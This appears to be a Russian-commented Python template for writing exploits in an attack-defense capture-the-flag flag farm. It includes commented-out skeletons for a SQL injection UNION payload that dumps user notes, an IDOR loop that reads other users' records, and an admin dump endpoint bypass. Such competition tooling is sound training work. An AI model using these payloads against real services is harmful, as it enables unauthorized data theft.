#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Шаблон сплойта для simple_farm (04_farm.py).

Контракт: функция exploit(host, config) -> список строк / строка / None.
Возвращай всё, что нашёл, — флаги ферма вытащит сама по регулярке из config.json
(по умолчанию формат ForcAD: 31 символ A-Z0-9 и знак "=" в конце).

Ферма подставляет host = IP каждой команды-жертвы из config.json.
Пиши сплойт так, будто он запускается против ОДНОЙ команды. Ниже 3 готовых
примера-каркаса: SQLi-дамп, IDOR и обход авторизации. Раскомментируй нужный.
"""

import json  # noqa: F401
import urllib.parse
import urllib.request


def _get(url, timeout=8):
    """GET без requests (на вулнбоксе может не быть pip-пакетов)."""
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def _post(url, data, timeout=8):
    req = urllib.request.Request(
        url, data=urllib.parse.urlencode(data).encode(), method="POST"
    )
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def exploit(host, config):
    """Верни строку/список строк с украденными данными (флаги ферма найдёт сама)."""
    port = 8080  # порт сервиса-жертвы: посмотри в nmap/исходниках

    # ---------------------------------------------------------------
    # Пример 1. SQL-инъекция: достаём всю таблицу с заметками пользователей
    # (чекер кладёт флаг как «заметку» конкретного пользователя)
    # ---------------------------------------------------------------
    # payload = "' UNION SELECT 1, group_concat(note), 3 FROM notes-- -"
    # url = "http://%s:%d/notes?user=%s" % (host, port, urllib.parse.quote(payload))
    # return _get(url)

    # ---------------------------------------------------------------
    # Пример 2. IDOR: перебираем чужие id и читаем чужие записи
    # ---------------------------------------------------------------
    # results = []
    # for uid in range(1, 60):
    #     try:
    #         results.append(_get("http://%s:%d/note/%d" % (host, port, uid)))
    #     except Exception:
    #         pass
    # return results

    # ---------------------------------------------------------------
    # Пример 3. Обход авторизации / debug-эндпоинт
    # ---------------------------------------------------------------
    # return _get("http://%s:%d/admin/dump" % (host, port))

    # Демо-режим: проверка связки с фермы (вернёт фейковый флаг с мок-сервера)
    try:
        return _get("http://%s:%d/notes?user=1" % (host, port))
    except Exception:
        return None
